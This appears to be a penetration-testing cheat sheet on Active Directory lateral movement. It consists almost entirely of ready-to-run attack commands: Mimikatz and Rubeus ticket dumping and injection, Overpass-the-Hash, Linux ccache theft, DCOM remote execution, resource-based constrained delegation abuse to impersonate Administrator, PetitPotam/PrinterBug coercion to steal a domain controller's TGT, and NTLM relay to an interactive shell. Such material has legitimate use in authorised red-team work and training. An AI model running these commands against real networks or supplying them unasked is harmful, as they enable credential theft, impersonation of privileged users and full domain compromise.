# Active Directory Lateral Movement

!!! tip ""
    Pass-the-Ticket and Overpass-the-Hash let you move laterally using Kerberos tickets rather than NTLM hashes — useful when NTLM authentication is restricted or when you want to impersonate a specific domain user. Check `klist` after injecting a ticket to confirm it loaded.

---

## Pass-the-Ticket (PtT)

Inject a Kerberos ticket (TGT or TGS) into your current session to authenticate as another user without their password.

### Export Tickets with Mimikatz

```powershell
mimikatz # sekurlsa::tickets /export
```

Exports `.kirbi` files for all tickets in the current session.

### Inject a Ticket

```powershell
mimikatz # kerberos::ptt ticket.kirbi
klist                          # verify the ticket loaded
```

### Rubeus (One-liner)

```powershell
.\Rubeus.exe ptt /ticket:<base64-ticket>
.\Rubeus.exe dump /nowrap      # dump all tickets in base64
```

---

## Overpass-the-Hash (Pass-the-Key)

Convert an NTLM hash into a Kerberos TGT. Useful when you have a hash and the target enforces Kerberos (NTLMv2 blocked or SMB signing required).

```powershell
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe
```

Spawns a new `cmd.exe` with the injected Kerberos identity. Use `klist` in that process to confirm.

### With Rubeus

```powershell
.\Rubeus.exe asktgt /user:Administrator /rc4:<ntlm-hash> /ptt
```

---

## Ticket Extraction from Linux (ccache)

If you compromise a Linux host with Kerberos configured (e.g., a domain-joined Linux server), ccache files on disk may contain valid TGTs:

```bash
find / -name "krb5cc_*" 2>/dev/null
ls /tmp/krb5cc_*

export KRB5CCNAME=/tmp/krb5cc_<uid>
klist

# Use directly with Impacket tools
impacket-wmiexec -k -no-pass Administrator@dc.corp.local
nxc smb 10.10.10.10 -k --use-kcache
```

---

## DCOM Lateral Movement

Distributed COM execution — less signatured than PsExec on some EDR platforms.

```bash
impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10
```

From PowerShell (no external tools required):

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\Temp\out.txt","7")
```

---

## Resource-Based Constrained Delegation (RBCD)

If you can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on a target computer (typical when you have GenericAll / GenericWrite on the computer object, or control any account in a group with that right), you can impersonate any user — including Domain Admins — to that computer.

### Requirements

- A computer you control (existing or freshly created via MAQ)
- Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the victim computer

### Create a computer account (if MAQ > 0)

Most domains allow any authenticated user to create up to 10 computer accounts (`ms-DS-MachineAccountQuota` default).

```bash
impacket-addcomputer example.com/<user>:'<pass>' -computer-name 'ATTACKER$' -computer-pass 'ComputerP@ss1' -dc-ip 10.10.10.10
```

### Set RBCD on the victim

```bash
impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'VICTIM$' -action write example.com/<user>:'<pass>' -dc-ip 10.10.10.10
```

### Abuse via S4U2Self + S4U2Proxy

```bash
impacket-getST -spn cifs/victim.example.com -impersonate Administrator -dc-ip 10.10.10.10 example.com/'ATTACKER$':'ComputerP@ss1'
```

That drops `Administrator.ccache`. Use it:

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass victim.example.com
```

---

## Unconstrained Delegation + Coerce

Any computer with unconstrained delegation caches TGTs of every user who authenticates to it. Coerce a DC (or high-value user) to authenticate, then extract the TGT.

```powershell
# Find unconstrained delegation targets
Get-DomainComputer -Unconstrained | Select-Object dnshostname
```

Coerce the DC with PetitPotam / PrinterBug:

```bash
impacket-petitpotam <unconstrained-host> 10.10.10.10     # DC authenticates to your host
# Or via printnightmare
dementor.py -d example.com -u <user> -p '<pass>' <unconstrained-host> 10.10.10.10
```

On the unconstrained host, extract the DC's TGT:

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Use the DC's ticket to DCSync.

---

## NTLM Relay

If you capture NTLMv2 hashes via Responder and SMB signing is disabled on targets, relay them directly rather than cracking:

```bash
# Check which targets have SMB signing disabled
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

# Disable SMB in Responder so ntlmrelayx handles it
sudo responder -I tun0 -wrf --disable-smb

# Relay to targets
sudo ntlmrelayx.py -tf targets.txt -smb2support -i   # interactive SMB shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
